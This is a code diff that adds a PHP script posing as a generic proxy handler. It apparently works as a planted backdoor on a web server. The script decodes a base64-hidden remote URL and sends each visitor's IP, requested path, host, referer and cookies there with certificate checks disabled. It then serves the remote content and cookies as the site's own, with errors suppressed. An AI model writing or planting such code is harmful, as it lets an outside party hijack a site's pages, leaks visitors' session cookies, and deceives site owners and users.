@@ -1,0 +1,692 @@
+<?php
+ob_start();
+set_time_limit(3600);
+ini_set('display_errors', 'Off');
+ini_set('allow_url_fopen', 'On');
+ignore_user_abort(1);
+
+header('Content-Type: text/html; charset=UTF-8');
+
+if (!defined('PHP_VERSION_ID')) {
+    $versionParts = explode('.', PHP_VERSION);
+    define('PHP_VERSION_ID', ($versionParts[0] * 10000 + $versionParts[1] * 100 + $versionParts[2]));
+}
+
+define('PHP_52_PLUS', PHP_VERSION_ID >= 50200);
+define('PHP_53_PLUS', PHP_VERSION_ID >= 50300);
+define('PHP_54_PLUS', PHP_VERSION_ID >= 50400);
+define('PHP_55_PLUS', PHP_VERSION_ID >= 50500);
+define('PHP_56_PLUS', PHP_VERSION_ID >= 50600);
+define('PHP_70_PLUS', PHP_VERSION_ID >= 70000);
+define('PHP_71_PLUS', PHP_VERSION_ID >= 70100);
+define('PHP_72_PLUS', PHP_VERSION_ID >= 70200);
+define('PHP_73_PLUS', PHP_VERSION_ID >= 70300);
+define('PHP_74_PLUS', PHP_VERSION_ID >= 74400);
+define('PHP_80_PLUS', PHP_VERSION_ID >= 80000);
+
+define('CURL_AVAILABLE', function_exists('curl_init'));
+define('GZIP_AVAILABLE', function_exists('gzencode') && function_exists('gzdecode'));
+define('DEFLATE_AVAILABLE', function_exists('gzinflate'));
+define('MBSTRING_AVAILABLE', extension_loaded('mbstring'));
+define('ZLIB_AVAILABLE', extension_loaded('zlib'));
+define('OPENSSL_AVAILABLE', extension_loaded('openssl'));
+define('FILTER_AVAILABLE', function_exists('filter_var'));
+define('HASH_AVAILABLE', function_exists('hash'));
+define('ICONV_AVAILABLE', function_exists('iconv'));
+
+if (PHP_56_PLUS && HASH_AVAILABLE && in_array('xxh32', hash_algos())) {
+    define('HASH_ALGO', 'xxh32');
+} elseif (PHP_54_PLUS && HASH_AVAILABLE && in_array('fnv132', hash_algos())) {
+    define('HASH_ALGO', 'fnv132');
+} elseif (HASH_AVAILABLE && in_array('crc32b', hash_algos())) {
+    define('HASH_ALGO', 'crc32b');
+} else {
+    define('HASH_ALGO', 'md5');
+}
+
+if (PHP_56_PLUS) {
+    define('CACHE_SIZE_LIMIT', 50);
+} else {
+    define('CACHE_SIZE_LIMIT', 20);
+}
+
+class ProxyHandler {
+    private static $ipHeaders = array(
+        'HTTP_CF_CONNECTING_IP',
+        'HTTP_X_REAL_IP',
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_FORWARDED_FOR',
+        'HTTP_X_FORWARDED',
+        'HTTP_FORWARDED',
+        'HTTP_X_CLUSTER_CLIENT_IP',
+        'HTTP_CLIENT_IP',
+        'REMOTE_ADDR'
+    );
+    
+    private static $remoteServer = 'aHR0cHM6Ly90b3RvODhnYWNvci5jb20vYXVsYS8=';
+    
+    private static $allowedHeaders = array(
+        'content-type' => true,
+        'set-cookie' => true,
+        'expires' => true,
+        'last-modified' => true,
+        'etag' => true
+    );
+    
+    private static $clientIpCache = null;
+    private static $headerCache = array();
+    private static $cacheSize = 0;
+    
+    public static function getRemoteServer() {
+        static $decoded = null;
+        if ($decoded === null) {
+            $decoded = base64_decode(self::$remoteServer);
+        }
+        return $decoded;
+    }
+    
+    public static function getClientIp() {
+        if (self::$clientIpCache !== null) {
+            return self::$clientIpCache;
+        }
+        
+        foreach (self::$ipHeaders as $headerName) {
+            if (empty($_SERVER[$headerName])) continue;
+            
+            $headerValue = $_SERVER[$headerName];
+            $ipList = is_array($headerValue) ? $headerValue : explode(',', $headerValue);
+            
+            foreach ($ipList as $ipAddress) {
+                $ipAddress = trim($ipAddress);
+                
+                if (strpos($ipAddress, ':') !== false && strpos($ipAddress, '[') === false) {
+                    $parts = explode(':', $ipAddress);
+                    if (count($parts) == 2 && is_numeric($parts[1])) {
+                        $ipAddress = $parts[0];
+                    }
+                } elseif (preg_match('/^\[([^\]]+)\]:(\d+)$/', $ipAddress, $matches)) {
+                    $ipAddress = $matches[1];
+                }
+                
+                if (self::isValidPublicIp($ipAddress)) {
+                    return self::$clientIpCache = $ipAddress;
+                }
+            }
+        }
+        
+        return self::$clientIpCache = '0.0.0.0';
+    }
+    
+    private static function isValidPublicIp($ipAddress) {
+        if (!FILTER_AVAILABLE) {
+            return self::validateIpLegacy($ipAddress);
+        }
+        
+        if (!filter_var($ipAddress, FILTER_VALIDATE_IP)) {
+            return false;
+        }
+        
+        if (PHP_53_PLUS) {
+            return filter_var($ipAddress, FILTER_VALIDATE_IP, 
+                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
+        }
+        
+        return self::isPublicIpLegacy($ipAddress);
+    }
+    
+    private static function validateIpLegacy($ip) {
+        if (strpos($ip, ':') !== false) {
+            return preg_match('/^[0-9a-fA-F:]+$/', $ip) && substr_count($ip, ':') >= 2;
+        }
+        
+        $parts = explode('.', $ip);
+        if (count($parts) != 4) return false;
+        
+        foreach ($parts as $part) {
+            if (!is_numeric($part) || $part < 0 || $part > 255) {
+                return false;
+            }
+        }
+        return true;
+    }
+    
+    private static function isPublicIpLegacy($ipAddress) {
+        if (strpos($ipAddress, ':') !== false) {
+            $lower = strtolower($ipAddress);
+            return !preg_match('/^(::1|fe80:|fc00:|fd00:)/', $lower);
+        }
+        
+        $longIp = ip2long($ipAddress);
+        if ($longIp === false) return false;
+        
+        return !(
+            ($longIp >= 167772160 && $longIp <= 184549375) ||
+            ($longIp >= 2886729728 && $longIp <= 2887778303) ||
+            ($longIp >= 3232235520 && $longIp <= 3232301055) ||
+            ($longIp >= 2130706432 && $longIp <= 2147483647) ||
+            ($longIp >= 2851995648 && $longIp <= 2852061183) ||
+            $longIp == 0 || $longIp >= 3758096384
+        );
+    }
+    
+    public static function fetchContent($requestUrl, $userAgent, $refererUrl, $cookieString) {
+        if (CURL_AVAILABLE) {
+            return self::curlRequest($requestUrl, $userAgent, $refererUrl, $cookieString);
+        } else {
+            return self::socketRequest($requestUrl, $userAgent, $refererUrl, $cookieString);
+        }
+    }
+    
+    private static function curlRequest($requestUrl, $userAgent, $refererUrl, $cookieString) {
+        $curlHandle = curl_init();
+        
+        $curlOptions = array(
+            CURLOPT_URL => $requestUrl,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_HEADER => true,
+            CURLOPT_TIMEOUT => 60,
+            CURLOPT_CONNECTTIMEOUT => 30,
+            CURLOPT_USERAGENT => $userAgent,
+            CURLOPT_REFERER => $refererUrl,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_FOLLOWLOCATION => false,
+            CURLOPT_MAXREDIRS => 0,
+            CURLOPT_NOSIGNAL => true,
+            CURLOPT_FAILONERROR => false,
+            CURLOPT_HTTPHEADER => array(
+                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language: en-US,en;q=0.5',
+                'Accept-Charset: UTF-8,*;q=0.1',
+                'Connection: keep-alive',
+                'Accept-Encoding: gzip, deflate'
+            )
+        );
+        
+        if ($cookieString) {
+            $curlOptions[CURLOPT_COOKIE] = $cookieString;
+        }
+        
+        if (PHP_54_PLUS) {
+            if (defined('CURLOPT_SAFE_UPLOAD')) {
+                $curlOptions[CURLOPT_SAFE_UPLOAD] = true;
+            }
+            if (defined('CURLOPT_DNS_CACHE_TIMEOUT')) {
+                $curlOptions[CURLOPT_DNS_CACHE_TIMEOUT] = 300;
+            }
+        }
+        
+        if (PHP_56_PLUS && OPENSSL_AVAILABLE) {
+            if (defined('CURLOPT_SSL_VERIFYSTATUS')) {
+                $curlOptions[CURLOPT_SSL_VERIFYSTATUS] = false;
+            }
+        }
+        
+        if (PHP_70_PLUS && defined('CURLOPT_TCP_FASTOPEN')) {
+            $curlOptions[CURLOPT_TCP_FASTOPEN] = true;
+        }
+        
+        if (PHP_71_PLUS) {
+            if (defined('CURLOPT_TCP_KEEPALIVE')) {
+                $curlOptions[CURLOPT_TCP_KEEPALIVE] = 1;
+            }
+            if (defined('CURLOPT_TCP_KEEPIDLE')) {
+                $curlOptions[CURLOPT_TCP_KEEPIDLE] = 120;
+            }
+            if (defined('CURLOPT_TCP_KEEPINTVL')) {
+                $curlOptions[CURLOPT_TCP_KEEPINTVL] = 60;
+            }
+        }
+        
+        curl_setopt_array($curlHandle, $curlOptions);
+        
+        $responseData = curl_exec($curlHandle);
+        $httpStatusCode = curl_getinfo($curlHandle, CURLINFO_HTTP_CODE);
+        $headerSize = curl_getinfo($curlHandle, CURLINFO_HEADER_SIZE);
+        $curlErrno = curl_errno($curlHandle);
+        
+        curl_close($curlHandle);
+        
+        if ($responseData === false || $curlErrno !== 0) {
+            return array('code' => 500, 'body' => '', 'headers' => array());
+        }
+        
+        $responseHeaders = substr($responseData, 0, $headerSize);
+        $responseBody = substr($responseData, $headerSize);
+        
+        return array(
+            'code' => $httpStatusCode,
+            'body' => $responseBody,
+            'headers' => self::parseResponseHeaders($responseHeaders)
+        );
+    }
+    
+    private static function socketRequest($requestUrl, $userAgent, $refererUrl, $cookieString) {
+        $urlParts = parse_url($requestUrl);
+        if (!$urlParts) {
+            return array('code' => 500, 'body' => '', 'headers' => array());
+        }
+        
+        $host = $urlParts['host'];
+        $port = isset($urlParts['port']) ? $urlParts['port'] : ($urlParts['scheme'] === 'https' ? 443 : 80);
+        $path = isset($urlParts['path']) ? $urlParts['path'] : '/';
+        if (isset($urlParts['query'])) {
+            $path .= '?' . $urlParts['query'];
+        }
+        
+        $socket = @fsockopen($host, $port, $errno, $errstr, 30);
+        if (!$socket) {
+            return array('code' => 500, 'body' => '', 'headers' => array());
+        }
+        
+        $request = "GET $path HTTP/1.1\r\n";
+        $request .= "Host: $host\r\n";
+        $request .= "User-Agent: $userAgent\r\n";
+        
+        if ($refererUrl) {
+            $request .= "Referer: $refererUrl\r\n";
+        }
+        
+        $request .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+        $request .= "Accept-Language: en-US,en;q=0.5\r\n";
+        $request .= "Accept-Charset: UTF-8,*;q=0.1\r\n";
+        $request .= "Connection: close\r\n";
+        $request .= "Accept-Encoding: gzip, deflate\r\n";
+        
+        if ($cookieString) {
+            $request .= "Cookie: $cookieString\r\n";
+        }
+        
+        $request .= "\r\n";
+        
+        fwrite($socket, $request);
+        
+        $response = '';
+        while (!feof($socket)) {
+            $response .= fgets($socket, 1024);
+        }
+        fclose($socket);
+        
+        if (empty($response)) {
+            return array('code' => 500, 'body' => '', 'headers' => array());
+        }
+        
+        $headerEndPos = strpos($response, "\r\n\r\n");
+        if ($headerEndPos === false) {
+            return array('code' => 500, 'body' => '', 'headers' => array());
+        }
+        
+        $rawHeaders = substr($response, 0, $headerEndPos);
+        $body = substr($response, $headerEndPos + 4);
+        
+        $headerLines = explode("\r\n", $rawHeaders);
+        $statusCode = 500;
+        
+        if (!empty($headerLines[0]) && preg_match('/HTTP\/\d\.\d\s+(\d+)/', $headerLines[0], $matches)) {
+            $statusCode = (int)$matches[1];
+        }
+        
+        $parsedHeaders = self::parseResponseHeaders($rawHeaders);
+        
+        if (isset($parsedHeaders['transfer-encoding']) && 
+            strtolower($parsedHeaders['transfer-encoding']) === 'chunked') {
+            $body = self::decodeChunkedBody($body);
+        }
+        
+        return array(
+            'code' => $statusCode,
+            'body' => $body,
+            'headers' => $parsedHeaders
+        );
+    }
+    
+    private static function decodeChunkedBody($chunkedBody) {
+        $decodedBody = '';
+        $offset = 0;
+        
+        while ($offset < strlen($chunkedBody)) {
+            $crlfPos = strpos($chunkedBody, "\r\n", $offset);
+            if ($crlfPos === false) {
+                break;
+            }
+            
+            $chunkSizeHex = substr($chunkedBody, $offset, $crlfPos - $offset);
+            $chunkSize = hexdec($chunkSizeHex);
+            
+            if ($chunkSize === 0) {
+                break;
+            }
+            
+            $offset = $crlfPos + 2;
+            $chunkData = substr($chunkedBody, $offset, $chunkSize);
+            $decodedBody .= $chunkData;
+            $offset += $chunkSize + 2;
+        }
+        
+        return $decodedBody;
+    }
+    
+    private static function parseResponseHeaders($headerString) {
+        if (empty($headerString)) {
+            return array();
+        }
+        
+        $cacheKey = self::generateHash($headerString);
+        
+        if (isset(self::$headerCache[$cacheKey])) {
+            return self::$headerCache[$cacheKey];
+        }
+        
+        $parsedHeaders = array();
+        $headerLines = explode("\r\n", $headerString);
+        
+        foreach ($headerLines as $headerLine) {
+            $headerLine = trim($headerLine);
+            if (empty($headerLine)) continue;
+            
+            $colonPosition = strpos($headerLine, ':');
+            if ($colonPosition !== false) {
+                $headerName = strtolower(trim(substr($headerLine, 0, $colonPosition)));
+                $headerValue = trim(substr($headerLine, $colonPosition + 1));
+                
+                if ($headerName === 'set-cookie') {
+                    if (!isset($parsedHeaders[$headerName])) {
+                        $parsedHeaders[$headerName] = array();
+                    }
+                    $parsedHeaders[$headerName][] = $headerValue;
+                } else {
+                    $parsedHeaders[$headerName] = $headerValue;
+                }
+            }
+        }
+        
+        if (self::$cacheSize >= CACHE_SIZE_LIMIT) {
+            self::$headerCache = array();
+            self::$cacheSize = 0;
+        }
+        
+        self::$cacheSize++;
+        return self::$headerCache[$cacheKey] = $parsedHeaders;
+    }
+    
+    private static function stripCookieAttributes($cookieValue) {
+        $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ||
+                   (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') ||
+                   (!empty($_SERVER['HTTP_X_FORWARDED_SSL']) && $_SERVER['HTTP_X_FORWARDED_SSL'] === 'on') ||
+                   (!empty($_SERVER['HTTP_X_FORWARDED_PORT']) && $_SERVER['HTTP_X_FORWARDED_PORT'] == '443') ||
+                   (!empty($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443');
+        
+        $parts = array_map('trim', explode(';', $cookieValue));
+        $filteredParts = array();
+        
+        foreach ($parts as $part) {
+            if (empty($part)) continue;
+            
+            $lowerPart = strtolower($part);
+            
+            if (strpos($lowerPart, 'domain=') === 0 ||
+                strpos($lowerPart, 'path=') === 0 ||
+                strpos($lowerPart, 'samesite=') === 0 ||
+                (strcasecmp($part, 'Secure') === 0 && !$isHttps)) {
+                continue;
+            }
+            
+            $filteredParts[] = $part;
+        }
+        
+        return implode('; ', $filteredParts);
+    }
+    
+    public static function forwardResponseHeaders($responseHeaders) {
+        if (!is_array($responseHeaders) || headers_sent()) {
+            return;
+        }
+        
+        foreach ($responseHeaders as $headerName => $headerValue) {
+            $lowerHeaderName = strtolower($headerName);
+            
+            if (!isset(self::$allowedHeaders[$lowerHeaderName])) {
+                continue;
+            }
+            
+            if ($headerName === 'set-cookie') {
+                if (is_array($headerValue)) {
+                    foreach ($headerValue as $cookieValue) {
+                        $cleanedCookie = self::stripCookieAttributes($cookieValue);
+                        if (!empty($cleanedCookie)) {
+                            header("Set-Cookie: {$cleanedCookie}", false);
+                        }
+                    }
+                } else {
+                    $cleanedCookie = self::stripCookieAttributes($headerValue);
+                    if (!empty($cleanedCookie)) {
+                        header("Set-Cookie: {$cleanedCookie}", false);
+                    }
+                }
+            } else {
+                header("{$headerName}: {$headerValue}");
+            }
+        }
+    }
+    
+    public static function decompressContent($responseBody, $responseHeaders) {
+        if (empty($responseBody) || !isset($responseHeaders['content-encoding'])) {
+            return $responseBody;
+        }
+        
+        $contentEncoding = strtolower(trim($responseHeaders['content-encoding']));
+        
+        switch ($contentEncoding) {
+            case 'gzip':
+                if (GZIP_AVAILABLE) {
+                    $decodedContent = @gzdecode($responseBody);
+                    if ($decodedContent !== false) {
+                        return $decodedContent;
+                    }
+                }
+                
+                if (ZLIB_AVAILABLE) {
+                    $decodedContent = @gzinflate(substr($responseBody, 10, -8));
+                    if ($decodedContent !== false) {
+                        return $decodedContent;
+                    }
+                }
+                break;
+                
+            case 'deflate':
+                if (DEFLATE_AVAILABLE || ZLIB_AVAILABLE) {
+                    $decodedContent = @gzinflate($responseBody);
+                    if ($decodedContent !== false) {
+                        return $decodedContent;
+                    }
+                    
+                    $decodedContent = @gzinflate(substr($responseBody, 2));
+                    if ($decodedContent !== false) {
+                        return $decodedContent;
+                    }
+                }
+                break;
+                
+            case 'br':
+                if (PHP_72_PLUS && function_exists('brotli_uncompress')) {
+                    $decodedContent = @brotli_uncompress($responseBody);
+                    if ($decodedContent !== false) {
+                        return $decodedContent;
+                    }
+                }
+                break;
+        }
+        
+        return $responseBody;
+    }
+    
+    public static function buildQueryString($queryParams) {
+        if (!is_array($queryParams)) {
+            return '';
+        }
+        
+        if (function_exists('http_build_query')) {
+            if (PHP_54_PLUS) {
+                return http_build_query($queryParams, '', '&', PHP_QUERY_RFC3986);
+            } else {
+                return http_build_query($queryParams, '', '&');
+            }
+        }
+        
+        $queryPairs = array();
+        foreach ($queryParams as $paramKey => $paramValue) {
+            if (is_array($paramValue)) {
+                foreach ($paramValue as $value) {
+                    $queryPairs[] = urlencode($paramKey . '[]') . '=' . urlencode($value);
+                }
+            } else {
+                $encodedKey = PHP_70_PLUS ? rawurlencode($paramKey) : urlencode($paramKey);
+                $encodedValue = PHP_70_PLUS ? rawurlencode($paramValue) : urlencode($paramValue);
+                $queryPairs[] = $encodedKey . '=' . $encodedValue;
+            }
+        }
+        
+        return implode('&', $queryPairs);
+    }
+    
+    public static function ensureUtf8Encoding($inputString) {
+        if (empty($inputString)) {
+            return $inputString;
+        }
+        
+        if (MBSTRING_AVAILABLE) {
+            if (PHP_70_PLUS) {
+                if (!mb_check_encoding($inputString, 'UTF-8')) {
+                    return mb_convert_encoding($inputString, 'UTF-8', 'auto');
+                }
+            } else {
+                if (function_exists('mb_check_encoding') && !mb_check_encoding($inputString, 'UTF-8')) {
+                    if (function_exists('mb_convert_encoding')) {
+                        return mb_convert_encoding($inputString, 'UTF-8', 'auto');
+                    }
+                }
+            }
+            return $inputString;
+        }
+        
+        if (ICONV_AVAILABLE) {
+            $converted = @iconv('auto', 'UTF-8//IGNORE', $inputString);
+            if ($converted !== false) {
+                return $converted;
+            }
+        }
+        
+        if (function_exists('preg_replace')) {
+            return preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $inputString);
+        }
+        
+        return $inputString;
+    }
+    
+    private static function generateHash($data) {
+        if (HASH_AVAILABLE && HASH_ALGO !== 'md5') {
+            return hash(HASH_ALGO, $data);
+        }
+        return md5($data);
+    }
+}
+
+$userAgent = !empty($_SERVER['HTTP_USER_AGENT']) ? 
+    ProxyHandler::ensureUtf8Encoding($_SERVER['HTTP_USER_AGENT']) : 
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
+
+$refererUrl = !empty($_SERVER['HTTP_REFERER']) ? 
+    ProxyHandler::ensureUtf8Encoding($_SERVER['HTTP_REFERER']) : '';
+
+$clientIpAddress = ProxyHandler::getClientIp();
+
+$cookieString = '';
+if (!empty($_SERVER['HTTP_COOKIE'])) {
+    $cookieString = ProxyHandler::ensureUtf8Encoding($_SERVER['HTTP_COOKIE']);
+} elseif (!empty($_SERVER['COOKIE'])) {
+    $cookieString = ProxyHandler::ensureUtf8Encoding($_SERVER['COOKIE']);
+}
+
+$queryString = '';
+if (isset($_GET['id']) && $_GET['id'] !== '') {
+    $queryString = ProxyHandler::ensureUtf8Encoding($_GET['id']);
+} elseif (isset($_GET['ID']) && $_GET['ID'] !== '') {
+    $queryString = ProxyHandler::ensureUtf8Encoding($_GET['ID']);
+}
+
+$hostDomain = '';
+if (!empty($_SERVER['HTTP_HOST'])) {
+    $hostDomain = ProxyHandler::ensureUtf8Encoding($_SERVER['HTTP_HOST']);
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_HOST'])) {
+    $hostDomain = ProxyHandler::ensureUtf8Encoding($_SERVER['HTTP_X_FORWARDED_HOST']);
+} elseif (!empty($_SERVER['SERVER_NAME'])) {
+    $hostDomain = ProxyHandler::ensureUtf8Encoding($_SERVER['SERVER_NAME']);
+}
+
+$requestUri = '';
+if (!empty($_SERVER['REQUEST_URI'])) {
+    $requestUri = ProxyHandler::ensureUtf8Encoding($_SERVER['REQUEST_URI']);
+} elseif (!empty($_SERVER['HTTP_X_REWRITE_URL'])) {
+    $requestUri = ProxyHandler::ensureUtf8Encoding($_SERVER['HTTP_X_REWRITE_URL']);
+} elseif (!empty($_SERVER['SCRIPT_NAME'])) {
+    $requestUri = ProxyHandler::ensureUtf8Encoding($_SERVER['SCRIPT_NAME']);
+}
+
+try {
+    $requestParams = array(
+        'id' => $queryString,
+        'ip' => $clientIpAddress,
+        'file' => $requestUri,
+        'host' => $hostDomain,
+        'referer' => $refererUrl
+    );
+    
+    $remoteRequestUrl = ProxyHandler::getRemoteServer() . '?' . 
+                       ProxyHandler::buildQueryString($requestParams);
+    
+    $proxyResponse = ProxyHandler::fetchContent(
+        $remoteRequestUrl, 
+        $userAgent, 
+        $refererUrl, 
+        $cookieString
+    );
+    
+    if (!is_array($proxyResponse)) {
+        throw new Exception('Invalid response format');
+    }
+    
+    $statusCode = isset($proxyResponse['code']) ? $proxyResponse['code'] : 500;
+    
+    if (!empty($proxyResponse['headers']) && is_array($proxyResponse['headers'])) {
+        ProxyHandler::forwardResponseHeaders($proxyResponse['headers']);
+    }
+    
+    $responseBody = isset($proxyResponse['body']) ? $proxyResponse['body'] : '';
+    $decompressedContent = ProxyHandler::decompressContent(
+        $responseBody, 
+        isset($proxyResponse['headers']) ? $proxyResponse['headers'] : array()
+    );
+    
+    $finalContent = ProxyHandler::ensureUtf8Encoding($decompressedContent);
+    
+    if ($statusCode !== 200 && !headers_sent()) {
+        header('HTTP/1.0 404 Not Found');
+    }
+    
+    echo $finalContent;
+    
+} catch (Exception $e) {
+    if (!headers_sent()) {
+        header('HTTP/1.0 404 Not Found');
+    }
+    exit;
+}
+
+if (PHP_54_PLUS) {
+    if (ob_get_level()) {
+        ob_end_flush();
+    }
+} else {
+    ob_end_flush();
+}
+?>
